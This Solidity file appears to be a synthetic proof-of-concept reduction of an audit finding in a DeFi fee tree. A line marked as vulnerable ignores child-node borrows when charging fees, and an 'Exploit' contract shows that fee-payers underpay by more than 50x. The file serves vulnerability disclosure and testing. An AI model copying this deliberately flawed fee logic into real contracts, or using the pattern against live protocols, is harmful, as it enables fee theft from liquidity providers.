// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-10: subtreeBorrowedX/Y is node-only, not subtree (#63176)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: fees use node.liq.subtreeBorrowedX as if it summed the whole
    subtree, but it only stores this node's own borrow — children not rolled up.
    Touching a wide parent undercharges; deep large borrows pay ~0.
    Vulnerable fee-base lines preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

struct NodeLiq {
    uint256 subtreeBorrowedX;
    uint256 subtreeBorrowedY;
    uint256 ownBorrowedX;
    uint256 ownBorrowedY;
    uint256 tLiq;
}

/// @dev Two-level tree: parent wide small borrow, child narrow large borrow.
contract FeeTree {
    NodeLiq public parent; // wide range
    NodeLiq public child; // narrower, under parent

    uint256 public lastTotalX;
    uint256 public lastColXPaid;
    uint256 public correctTotalX;
    uint256 public correctColXPaid;

    /// @dev Record taker borrow on a node (only updates that node's subtreeBorrowed).
    function addTakerBorrow(bool onParent, uint256 xBorrow, uint256 yBorrow, uint256 tLiq) external {
        if (onParent) {
            parent.tLiq += tLiq;
            // Source: Liq.sol — only node's own borrow
            parent.subtreeBorrowedX += xBorrow;
            parent.subtreeBorrowedY += yBorrow;
            parent.ownBorrowedX += xBorrow;
            parent.ownBorrowedY += yBorrow;
        } else {
            child.tLiq += tLiq;
            child.subtreeBorrowedX += xBorrow;
            child.subtreeBorrowedY += yBorrow;
            child.ownBorrowedX += xBorrow;
            child.ownBorrowedY += yBorrow;
        }
    }

    /// @notice Charge fees on parent update — uses non-propagated subtreeBorrowed.
    function chargeFeesOnParent(uint256 takerRateX64) external returns (uint256 colXPaid) {
        // prefix borrows omitted (0) for clarity
        uint256 totalXBorrows = 0;
        uint256 totalYBorrows = 0;
        // Source: Fee.sol fee charge
        // FIX: totalXBorrows += parent.ownBorrowedX + child.subtreeBorrowedX (propagate)
        totalXBorrows += parent.subtreeBorrowedX; // @> VULN: subtreeBorrowedX is node-only — children's borrows ignored when charging at parent
        totalYBorrows += parent.subtreeBorrowedY;
        lastTotalX = totalXBorrows;
        colXPaid = (totalXBorrows * takerRateX64) >> 64;
        lastColXPaid = colXPaid;
        totalYBorrows; // silence
    }

    /// @dev Correct: include child subtree borrows.
    function correctChargeOnParent(uint256 takerRateX64) external returns (uint256 colXPaid) {
        correctTotalX = parent.ownBorrowedX + child.subtreeBorrowedX;
        colXPaid = (correctTotalX * takerRateX64) >> 64;
        correctColXPaid = colXPaid;
    }
}

/// CREATE: tree(1)
contract Exploit {
    FeeTree public tree;
    uint256 public underpaid;
    uint256 public buggyPaid;
    uint256 public correctPaid;

    constructor() {
        tree = new FeeTree(); // 1
    }

    function run() external {
        // small borrow on wide parent (like 1e18 liq → 418 units in report)
        tree.addTakerBorrow(true, 418e18, 0, 1e18);
        // large borrow on child (1000e18 liq → 20561 units)
        tree.addTakerBorrow(false, 20561e18, 0, 1000e18);

        // 100% rate in Q64.64 = 1<<64
        uint256 rate = uint256(1) << 64;
        buggyPaid = tree.chargeFeesOnParent(rate);
        correctPaid = tree.correctChargeOnParent(rate);

        require(buggyPaid == 418e18, "buggy charges only parent own");
        require(correctPaid == 418e18 + 20561e18, "correct includes child");
        underpaid = correctPaid - buggyPaid;
        // Harm: makers lose ~98% of fees when parent touched first
        require(underpaid > buggyPaid * 40, "makers lose vast majority of fees");
        require(buggyPaid * 50 < correctPaid, "undercharge > 50x on child mass");
    }
}
